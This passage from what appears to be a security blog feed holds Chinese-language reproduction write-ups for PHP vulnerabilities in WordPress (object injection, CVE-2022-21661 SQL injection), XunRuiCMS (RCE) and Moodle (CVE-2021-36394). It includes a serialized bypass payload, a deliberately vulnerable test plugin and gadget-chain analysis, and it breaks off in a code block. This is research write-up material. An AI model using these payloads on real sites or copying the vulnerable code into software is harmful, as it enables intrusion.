alt="1"></p><p>如果我们输入的选择没有发生改变，就不会继续后面的代码，继续往下走，进入 <code>wp-includes/functions.php</code>中的<code>maybe_serialize</code>函数</p><p><img src="1645019673851-234d1ec8-df55-4aca-9061-e5135495d0b3.png" alt="1"></p><p>如果是数组或者对象，那么会直接序列化后返回。然后进入 <code>is_serialized</code>函数</p><p><img src="1645019938888-04cd4b78-79fd-4241-b3af-ff47887561e6.png" alt="1"></p><p>这里会取字符串的第一个字符进行比较，这里几乎囊括了反序列化字符串的所有类型，遇到是这一些的，返回后会再次反序列化，也就是进行了二次反序列化，这样几乎是防止了可能的反序列化。</p><p>这里遗漏了一个 <code>C</code>类型，官方文档对他的描述是 <code>custom object</code>，自定义对象，这个以前几乎没有用到过，因此这次进行了一次测试</p><p>代码：</p><p><img src="1645020351734-9990d977-de53-4a24-aca9-bd63b028f825.png" alt="1"></p><p>结果</p><p><img src="1645020369446-b14a18bd-de76-4cff-a147-8a6be7c72f58.png" alt="1"></p><p>同一个类，将类型从 <code>O</code>修改为了 <code>C</code>，反序列化运行后，虽然报错，但最后仍然会触发 <code>__destruct</code>方法，因此我们可以将一个正常的反序列化字符串，将第一个字符 <code>O</code>修改为 <code>C</code>，这样就可以逃过这里的二次反序列化，从而将我们的反序列化字符串写入数据库，等待触发即可。</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>本菜鸡找不到 <code>wordpress</code>的链子，只能随意触发一个 <code>__destruct</code>意思意思</p><p>这里使用 <code>wp-includes/Requests/Transport/cURL.php</code>中的 <code>Requests_Transport_cURL</code>类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">C:<span class="hljs-number">23</span>:<span class="hljs-string">&quot;Requests_Transport_cURL&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;<br></code></pre></td></tr></table></figure><p><img src="1645023884766-f85640ae-ec93-4dc7-8628-ac65c61c434b.png" alt="1"></p><p>查看数据库，并没有被二次序列化</p><p><img src="1645023970947-30b7edf1-91c0-48c7-bc57-5b393204ccfd.png" alt="1"></p><p>来到<code>wp-admin/options.php</code>，将 <code>db_version</code>修改为 10300</p><p><img src="1645023029331-b66ec169-d09a-4e68-99bf-e518e70d140a.png" alt="1"></p><p>这里一个意外的发现，修改数据库的时候就会触发漏洞入口</p><p><img src="1645023123738-90cfe6b9-ba3c-4223-bc49-51f3bbb56096.png" alt="1"></p><p>成功取出数据库中的反序列化串，并且执行反序列化</p><p><img src="1645024213088-02a0060d-93be-4e5b-8af9-b9fe7e7b1d9a.png" alt="1"></p><p>触发 <code>__destruct</code>方法</p><p><img src="1645024236432-924e1694-930c-4678-bd14-82905aed5cb9.png" alt="1"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>坑点不少，需要多琢磨，不说了，还是太菜了，都没法搞条链子。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文首发于奇安信攻防社区：&lt;a href=&quot;https://forum.butian.net/share/1303&quot;&gt;https://forum.butian.net/share/1303&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景</summary>
      
    
    
    
    <category term="PHP漏洞复现" scheme="https://d5shenwu.github.io/categories/PHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="PHP" scheme="https://d5shenwu.github.io/tags/PHP/"/>
    
    <category term="CVE" scheme="https://d5shenwu.github.io/tags/CVE/"/>
    
    <category term="漏洞复现" scheme="https://d5shenwu.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="WordPress" scheme="https://d5shenwu.github.io/tags/WordPress/"/>
    
    <category term="对象注入漏洞" scheme="https://d5shenwu.github.io/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>WordPress_5.8.2_核心SQL注入漏洞_CVE-2022-21661</title>
    <link href="https://d5shenwu.github.io/2022/02/15/WordPress-5-8-2-%E6%A0%B8%E5%BF%83SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2022-21661/"/>
    <id>https://d5shenwu.github.io/2022/02/15/WordPress-5-8-2-%E6%A0%B8%E5%BF%83SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2022-21661/</id>
    <published>2022-02-15T02:28:26.000Z</published>
    <updated>2022-11-04T14:19:30.946Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于奇安信攻防社区：<a href="https://forum.butian.net/share/1324">https://forum.butian.net/share/1324</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>这是最近爆出来的一个 <code>wordpress</code>的<code>SQL</code>注入漏洞，实际上不是一个可以直接利用的洞，而是<code>wordpress</code>的一个核心函数 <code>WP_Query</code>的漏洞，这个函数常被插件使用，因此能造成的危害也挺大，前台后台都有可能。</p><h2 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h2><p><code>wordpress &lt; 5.8.3</code></p><p>这里是修复链接</p><p><a href="https://github.com/WordPress/WordPress/commit/6f7032dcf423b67f90381d4f29a90d16f4829070">https://github.com/WordPress/WordPress/commit/6f7032dcf423b67f90381d4f29a90d16f4829070</a></p><p><img src="1645102019548-1c3129e9-7c36-4ce2-9de3-8cd16cb0ae77.png" alt="image.png"></p><p>我们 <code>git</code>下载后，恢复到上一个版本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">git <span class="hljs-keyword">clone</span> https:<span class="hljs-comment">//github.com/WordPress/WordPress</span><br>git checkout <span class="hljs-number">266</span>c58518846<br></code></pre></td></tr></table></figure><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>因为此漏洞在插件中出现较多，因此这里我们也造一个插件来进行测试复现，网上已经有师傅写好了 <code>demo</code>，我这里直接用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Plugin Name: CVE-2022-21661-test-plugin</span><br><span class="hljs-comment">Plugin URL: https://www.lsablog.com/networksec/penetration/cve-2022-21661-wordpress-core-sqli-analysis</span><br><span class="hljs-comment">Description: This plugin was made in order to test CVE-2022-21661 (wordpress core sql injection)</span><br><span class="hljs-comment">Version: v1.0</span><br><span class="hljs-comment">Author: LSA</span><br><span class="hljs-comment">Author&#x27;s Blog: https://www.lsablog.com/</span><br><span class="hljs-comment">License: MIT</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testSQLiCVE202221661</span>(<span class="hljs-params"></span>)</span>&#123;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;test-cve-2022-21661-plugin&#x27;</span>;<br><br>    <span class="hljs-variable">$inputData</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>    <span class="hljs-variable">$jsonDecodeInputData</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$inputData</span>,<span class="hljs-literal">true</span>);<br>    <span class="hljs-variable">$wpTest</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WP_Query</span>(<span class="hljs-variable">$jsonDecodeInputData</span>);<br>    <span class="hljs-title function_ invoke__">wp_die</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">add_action</span>(<span class="hljs-string">&#x27;wp_ajax_nopriv_testcve202221661&#x27;</span>,<span class="hljs-string">&#x27;testSQLiCVE202221661&#x27;</span>);<br></code></pre></td></tr></table></figure><p>写入 <code>php</code>文件，打包成 <code>zip</code>格式，后台安装插件并启用</p><p>这里的插件是不用权限就可以访问的，<code>admin</code>权限访问反而存在问题，正常访问显示如下</p><p><img src="1645103521554-d2846aaf-7df3-46e6-a553-003e4d061141.png" alt="image.png"></p><p>好了，接下来开始调试，看到插件代码，位于 <code>wp-content/plugins/CVE-2022-21661-test-plugin/CVE-2022-21661-test-plugin.php</code></p><p><img src="1645103635627-6bddf23b-653a-4b46-b4c8-3f3cb0f75a9b.png" alt="image.png"></p><p><code>post</code>的<code>data</code>使用了 <code>stripslashes</code>，<code>post</code>的参数默认会被转义，因此用这个函数去掉转义符等，然后 <code>json_decode</code>解码，也就是说我们传入的数据需要是 <code>json</code>格式的，最后传入 <code>WP_Query</code></p><p>跟进 <code>wp-includes/class-wp-query.php</code>的构造方法</p><p><img src="1645104192903-4b660d49-8c12-4c3a-8962-dde93ee542c6.png" alt="image.png"></p><p>继续跟进 <code>query</code>方法</p><p><img src="1645104421273-bc080a34-fa1a-4c53-8e20-aeeff30a5855.png" alt="image.png"></p><p><code>$query</code>是我们传入的 <code>json</code>解码后的数据，处理一下后进入 <code>get_posts</code>方法</p><p><img src="1645104830365-2be61a3c-870b-4018-a423-0f88356f5293.png" alt="image.png"></p><p>将 <code>$this-&gt;query_vars</code>赋值给了 <code>$q</code>，然后还加入了一些其他的参数，因此 <code>$q</code>部分可控，继续往下看</p><p><img src="1645105048461-3fc7776d-941d-4d52-95f0-9975d9fe1fa5.png" alt="image.png"></p><p><code>$this-&gt;is_singular</code>默认为 <code>false</code>，进入 <code>if</code>语句，然后使用 <code>parse_tax_query</code>方法处理 <code>$q</code>，我们看看代码</p><p><img src="1645340595117-4f864e36-96ca-4bf9-968e-33c3e2e2d0fe.png" alt="image.png"></p><p>在这里，<code>$q</code>中存在的一些值会赋值给 <code>$tax_query</code>，比如，<code>$q</code>中存在 <code>tax_query</code>这个键并且是数组的时候，就会将他的值存入 <code>$tax_query</code>，拉到最后可以看到实例化了 <code>WP_Tax_Query</code>，而 <code>$tax_query</code>的值就会作为初始化的值传入 <code>WP_Tax_Query</code></p><p><img src="1645340962424-faaba21b-6d7a-4359-a1cb-62f87e39c70a.png" alt="image.png"></p><p>看到 <code>wp-includes/class-wp-tax-query.php</code>中的 <code>__construct</code></p><p><img src="1645341126441-5696c72f-5575-4977-b827-17a1da1dcfc7.png" alt="image.png"></p><p>跟进 <code>sanitize_query</code>方法</p><p><img src="1645356871711-d4b92b4a-59b2-4932-b26c-553a4ab1afa9.png" alt="image.png"></p><p>这里是对 <code>$queries</code>的一些处理，返回值为 <code>$cleaned_query</code>，因此要找到可控的赋值</p><p><code>foreach</code>遍历 <code>$queries</code>，使用<code>is_first_order_clause</code>进行判断</p><p><img src="1645369819185-0728e203-6978-416a-87f5-74f6db6d42b7.png" alt="image.png"></p><p><code>$query</code>中存在一个值为数组，且数组的键为 <code>terms</code>就进入该分支，<code>$queries</code> 部分可控，因此很容易满足这个条件，最后和 <code>defaults</code>合并后存入 <code>$cleaned_query</code></p><p>这里返回后的数据最后会赋值给 <code>$this-&gt;queries</code>，后面会用到这个数据</p><p>回到比较上面的<code>$this-&gt;tax_query-&gt;get_sql</code>，进入 <code>wp-includes/class-wp-tax-query.php</code>的 <code>get_sql</code>方法</p><p><img src="1645107644418-acac8222-7735-4e62-b20c-3d04a08d67a6.png" alt="image.png"></p><p>继续跟进 <code>get_sql_clauses</code>方法</p><p><img src="1645107786798-70da1fb4-92a8-49eb-90be-5a0af23a5d7a.png" alt="image.png"></p><p>这里就将 <code>$this-&gt;queries</code>取出来了，然后进入 <code>get_sql_for_query</code>方法</p><p><img src="1645109146065-168ca4d9-2bd8-46cd-ab6e-8e128dcfef3f.png" alt="image.png"></p><p>遍历 <code>$query</code>，当 <code>$clause</code>为数组时，进入 <code>elseif</code>分支，再跟进 <code>is_first_order_clause</code>方法进行判断</p><p><img src="1645109296540-adb8ff54-9bfb-43eb-8314-2db1e6abff59.png" alt="image.png"></p><p>这个判断很简单，为数组且包含 <code>terms</code>这个键时为真，继续跟进上面的 <code>get_sql_for_clause</code></p><p><img src="1645109675055-b98c4529-6679-4a87-b062-e5fc4b9253f6.png" alt="image.png"></p><p>主要看到这个 <code>clean_query</code>方法，也是漏洞点所在的位置，这实际上是一个用于过滤潜在的危险的函数</p><p><img src="1645109756537-8e1e4e30-45d8-4869-b87f-e8cb01102056.png" alt="image.png"></p><p>前面的都是一些简单的判断，很容易就可以绕过，<code>$query[&#39;terms&#39;]</code>去重，最后进入 <code>transform_query</code>方法</p><p><img src="1645110303953-72fa8b9d-66fe-4521-93d7-5c719cbcf207.png" alt="image.png"></p><p>满足条件 <code>$query[&#39;field&#39;] == $resulting_field</code>即可绕过这个方法，不进行其他操作</p><p>回到 <code>get_sql_for_clause</code>方法，执行完 <code>clean_query</code>后的代码如下</p><p><img src="1645110644316-5c34cca6-eb90-448b-99ed-b2b380cc3b8c.png" alt="image.png"></p><p><code>$terms</code>接收 <code>clean_query</code>方法处理过的 <code>$clause[&#39;terms&#39;]</code>，当 <code>$operator</code>为 <code>NOT IN</code>时，就会拼接 <code>SQL</code>语句，造成注入，进入其他分支也是可以的，都一样，后面就不用讲了。</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><img src="1645371797533-b52f553e-d0e1-4afb-af14-b7fe762dd1f3.png" alt="image.png"></p><p>注意右下角的延时</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p><code>wordpress</code>的漏洞还是比较少的，尤其是这种核心漏洞，使用到这个函数的插件很容易受到影响，又很难受到影响，很容易是因为使用的插件还是很多的，很难是因为输入的参数存在转义，所以需要很多的凑巧才能成功利用，不过存在一个比较大的基数，找到受影响的应该不难，连续分析了两个 <code>wordpress</code>近期的漏洞，给我的感觉就是，大的系统不是没有漏洞，而是缺少挖到他的人。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文首发于奇安信攻防社区：&lt;a href=&quot;https://forum.butian.net/share/1324&quot;&gt;https://forum.butian.net/share/1324&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景</summary>
      
    
    
    
    <category term="PHP漏洞复现" scheme="https://d5shenwu.github.io/categories/PHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="PHP" scheme="https://d5shenwu.github.io/tags/PHP/"/>
    
    <category term="CVE" scheme="https://d5shenwu.github.io/tags/CVE/"/>
    
    <category term="SQL注入漏洞" scheme="https://d5shenwu.github.io/tags/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="漏洞复现" scheme="https://d5shenwu.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="WordPress" scheme="https://d5shenwu.github.io/tags/WordPress/"/>
    
  </entry>
  
  <entry>
    <title>XunRuiCMS_变量覆盖导致的前台RCE</title>
    <link href="https://d5shenwu.github.io/2022/01/25/XunRuiCMS-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%89%8D%E5%8F%B0RCE/"/>
    <id>https://d5shenwu.github.io/2022/01/25/XunRuiCMS-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%89%8D%E5%8F%B0RCE/</id>
    <published>2022-01-25T02:28:26.000Z</published>
    <updated>2022-12-10T05:29:38.677Z</updated>
    
    <content type="html"><![CDATA[<p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>先后在两篇文章中看到了这个<code>cms</code>，利用方式感觉很有意思，遂跟着复现一波写下了这篇文章。</p><h2 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h2><p>影响在此修复之前的版本 </p><p><a href="https://gitee.com/dayrui/xunruicms/commit/80e2d8f3008384d926c64163b7334a260edc0a51">https://gitee.com/dayrui/xunruicms/commit/80e2d8f3008384d926c64163b7334a260edc0a51</a></p><p>此处测试环境为修复的前一个版本，可 <code>git</code> 下载后执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">git checkout fad7b01<br></code></pre></td></tr></table></figure><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>我们可以根据修复记录来复现漏洞</p><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>首先定位到 <code>dayrui/Fcms/Core/View.php</code>的<code>display</code>方法，218 行存在一个 <code>extract</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$this</span>-&gt;_options, EXTR_OVERWRITE);<br></code></pre></td></tr></table></figure><p>第二个参数为 <code>EXTR_OVERWRITE</code>，也就是可以覆盖已存在的变量，那么只要 <code>$this-&gt;_options</code>可控，我们就可以得到一个变量覆盖漏洞，因此寻找赋值的位置<br>同样在该文件</p><p><img src="1644246657397-22191b3d-1b41-4a65-8632-f86a52e8d5bc.png" alt="image.png"></p><p>从注释可以看到这个方法是用来设置模板变量的，这里将传入的第一个参数全部放入了 <code>$this-&gt;_options</code><br><code>dayrui/Fcms/Control/Api/Api.php</code>中的 <code>template</code>方法使用 <code>assign</code>来设置模板变量，并且参数可以通过 <code>GET</code>得到，因此可控，间接导致了 <code>$this-&gt;_options</code>可控，之后又进入 <code>display</code>方法，触发 <code>extract</code>，因此存在变量覆盖漏洞</p><p><img src="1644247366176-b26669e0-0b2c-4766-a3bb-5e67f99e4f89.png" alt="image.png"></p><p>现在继续跟进 <code>display</code>方法</p><p><img src="1644324477787-3e232cfe-ed7f-436a-9a9e-5ea191e654a7.png" alt="image.png"></p><p>由于存在变量覆盖漏洞，因此 <code>$phpcmf_name</code>和 <code>$phpcmf_dir</code>都可控，之后进入 <code>get_file_name</code>方法，两个参数都可控，这个方法就不跟进看了，最后得到的 <code>$_view_file</code>可控，继续往下走</p><p><img src="1644324685908-e4ac4fa3-e46e-481d-93ff-1bb4f60f9311.png" alt="image.png"></p><p><code>load_view_file</code>方法会根据 <code>$_view_file</code>生成一个 <code>cache file</code>并返回文件路径，最后包含该文件</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>现在我们需要找到一处可以命令执行的地方，而 <code>View.php</code>中有一个 <code>list_tag</code>方法</p><p><img src="1644326182325-98df5d65-533c-44fb-81f5-4eec886f4a5b.png" alt="image.png"></p><p>这里存在一个 <code>switch ... case ...</code>当 <code>$system[&#39;action&#39;]</code>为 <code>function</code>时就可以进入上面的分支，从而有机会被执行</p><p>在变量覆盖块，我们讲到了可以包含模板文件，我们可以选择 <code>dayrui/Fcms/View/api_related.html</code></p><p>生成 <code>cache</code>文件后包含，在被包含的文件中，我们可以找到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">list_tag</span>(<span class="hljs-string">&quot;action=module module=<span class="hljs-subst">$mid</span> siteid=<span class="hljs-subst">$site</span> where=<span class="hljs-subst">$where</span> order=updatetime page=1 pagesize=<span class="hljs-subst">$pagesize</span> urlrule=<span class="hljs-subst">$urlrule</span>&quot;</span>);<br></code></pre></td></tr></table></figure><p>因此可以调用到 <code>list_tag</code>方法，并且可以用变量覆盖来控制参数，接下来我们进入 <code>list_tag</code></p><p><img src="1644326537174-64b2314c-eb4b-4c14-b1a5-030f46e3d5c5.png" alt="image.png"></p><p><code>$params</code>就是传进来的参数，也就是上面那一大串，部分为我们所控</p><p>这里使用 <code>explode</code>，按空格分割并写入数组，之后取出数组每一项用 <code>=</code>分割，分别得到 <code>$var</code>和 <code>$val</code>，最后如果存在 <code>$system[$var]</code>，就会用处理过的<code>$val</code>覆盖</p><p>因此我们可以利用可控的变量来覆盖 <code>$system[&#39;action&#39;]</code>从而进入 <code>function</code>分支，到后面就比较简单了，这里不多赘述。</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>因为调用 <code>display</code>的地方使用了 <code>ob_start</code>，因此一般的命令都没有回显，所以使用的弹计算器的方式</p><p>自己弹了一下自己，只是我的计算器早就被我删了</p><p><img src="1644334744634-94e79d78-cf97-4ec2-a5a3-d576a8405421.png" alt="image.png"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>利用方式很有意思，但是有一点点复杂，有兴趣的话可以自己手调一下，会有更多的收获的，若是有什么疑问的地方，欢迎私聊交流讨论。</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li><a href="https://xz.aliyun.com/t/10002">https://xz.aliyun.com/t/10002</a></li><li><a href="https://forum.butian.net/share/1072">https://forum.butian.net/share/1072</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。&lt;/p&gt;
&lt;h2 id=&quot;0x00-漏洞简介&quot;&gt;&lt;a href=&quot;#0x00-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞简介</summary>
      
    
    
    
    <category term="PHP漏洞复现" scheme="https://d5shenwu.github.io/categories/PHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="PHP" scheme="https://d5shenwu.github.io/tags/PHP/"/>
    
    <category term="未授权漏洞" scheme="https://d5shenwu.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="RCE" scheme="https://d5shenwu.github.io/tags/RCE/"/>
    
    <category term="漏洞复现" scheme="https://d5shenwu.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="CNVD" scheme="https://d5shenwu.github.io/tags/CNVD/"/>
    
    <category term="XunRuiCMS" scheme="https://d5shenwu.github.io/tags/XunRuiCMS/"/>
    
    <category term="变量覆盖" scheme="https://d5shenwu.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
    
  </entry>
  
  <entry>
    <title>Moodle_3.11_前台RCE_CVE-2021-36394</title>
    <link href="https://d5shenwu.github.io/2021/10/21/Moodle-3-11-%E5%89%8D%E5%8F%B0RCE-CVE-2021-36394/"/>
    <id>https://d5shenwu.github.io/2021/10/21/Moodle-3-11-%E5%89%8D%E5%8F%B0RCE-CVE-2021-36394/</id>
    <published>2021-10-21T02:28:26.000Z</published>
    <updated>2023-12-15T14:36:18.320Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于先知社区：<a href="https://xz.aliyun.com/t/10383">https://xz.aliyun.com/t/10383</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p><code>Moodle</code> 是世界上最流行的学习管理系统。在几分钟内开始创建您的在线学习网站！</p><p><code>Moodle</code>的<code>Shibboleth</code>认证模块存在一个未授权远程代码执行漏洞。这在大学中被广泛使用，以允许来自一所大学的学生与其他大学进行身份验证，从而使他们能够参加外部课程并与其他人一起玩乐。</p><h2 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span>.<span class="hljs-number">11</span>, <span class="hljs-number">3</span>.<span class="hljs-number">10</span> to <span class="hljs-number">3</span>.<span class="hljs-number">10</span>.<span class="hljs-number">4</span>, <span class="hljs-number">3</span>.<span class="hljs-number">9</span> to <span class="hljs-number">3</span>.<span class="hljs-number">9</span>.<span class="hljs-number">7</span> and earlier unsupported versions<br></code></pre></td></tr></table></figure><p>需要开启 <code>Shibboleth</code> 认证模块</p><p>可以 <code>fofa</code> 查看其使用，可以看到有 <code>13w</code> 条 <code>moodle</code> 应用</p><p><img src="0.png" alt="202210262318380.png"></p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>为了省去一些麻烦，这里我已经搭建好了漏洞 <code>docker</code>，可以在这里找到 <a href="https://github.com/N0puple/vulPOC/tree/main/Moodle/CVE-2021-36394%20Pre-Auth%20RCE%20in%20Moodle">CVE-2021-36394 Pre-Auth RCE in Moodle</a></p><p>执行如下操作</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span><br></code></pre></td></tr></table></figure><p>然后进入 <code>docker</code> ，更改文件 <code>/var/www/html/moodle-3.11.0/config.php</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">$CFG<span class="hljs-punctuation">-&gt;</span>wwwroot   = <span class="hljs-symbol">&#x27;http</span>:<span class="hljs-comment">//127.0.0.1&#x27;;</span><br></code></pre></td></tr></table></figure><p>将上面的链接改为自己的，必须是真实地址</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>根据作者 <a href="https://haxolot.com/posts/2021/moodle_pre_auth_shibboleth_rce_part1/">博客</a> 上讲的，此漏洞大概可分为三部分，<code>session</code> 文件写入，<code>moodle</code> 反序列化链，反序列化执行入口</p><h3 id="moodle-反序列化链"><a href="#moodle-反序列化链" class="headerlink" title="moodle 反序列化链"></a>moodle 反序列化链</h3><p>先来看反序列化链，这并没有在 <code>PHPGGC</code> 收录，所以需要自己找，这里提供一条的简单分析，对细节感兴趣的童鞋可以调试一下</p><p>首先是 <code>__destruct</code> 入口，位于 <code>lib/classes/lock/lock.php</code></p><p><img src="1.png" alt="202210262318380.png"></p><p>可以看到 <code>$key</code> 可控，并且在字符串中，因此可以触发 <code>__toString</code></p><p>我们选择 <code>availability/classes/tree.php</code> 中的 <code>__toString</code> ，如图</p><p><img src="2.png" alt="202210262318380.png"></p><p><code>$this-&gt;children</code> 可控，因此可以对象遍历，我们可以选一个可以让我们命令执行的类，选择 <code>lib/classes/dml/recordset_walk.php</code> 的 <code>core\dml\recordset_walk</code> ，因为这里有一个 <code>current</code> 方法可以 <code>call_user_func</code> ，并且参数可控</p><p><img src="3.png" alt="202210262318380.png"></p><p><code>$this-&gt;callback</code> 可控，<code>$resord</code> 由 <code>$this-&gt;recordset-&gt;current()</code> 得到，我们可以看到 <code>$this-&gt;recordset</code>  ，需要实现的方法有很多，结合定义可以知道，<code>$this-&gt;recordset</code> 必须实现 <code>Iterator</code> ，因此范围就可以缩得比较小，最终确定使用 <code>question/engine/questionusage.php</code> 中的 <code>question_attempt_iterator</code> 类，但这个类默认没有被加载，需要一个类作为中介，这里可以选择 <code>question/classes/external.php</code> 中的  <code>core_question_external</code></p><p>如此即可得到反序列化链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 